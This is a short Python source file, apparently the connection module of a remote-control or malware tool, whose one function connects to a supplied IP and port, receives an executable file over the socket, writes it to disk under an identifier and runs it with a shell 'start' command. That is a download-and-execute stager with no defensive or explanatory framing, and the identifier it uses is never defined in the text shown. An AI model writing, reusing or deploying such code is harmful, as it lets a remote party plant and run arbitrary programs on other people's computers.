# -*- coding:utf-8 -*-
# @FileName  :basic_conn.py
# @Time      :2022/11/24 20:37:43
# @Author    :D0WE1L1N
import socket
from os import rename, remove, system
from sys import exit
def _connect(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.recv(1024)
    s.send(bytes(str(len(_id)), 'utf8'))
    s.recv(1024)
    s.send(bytes(_id, 'utf8'))
    s.recv(1024)
    len_data = s.recv(1024).decode('utf8')
    s.send(bytes("OK", "UTF8"))
    upload_data = s.recv(int(len_data))
    f = open(f"{_id}.exe", "wb+")
    f.write(upload_data)
    f.close()
    s.close()
    system(f"start {_id}.exe")
    exit(0)

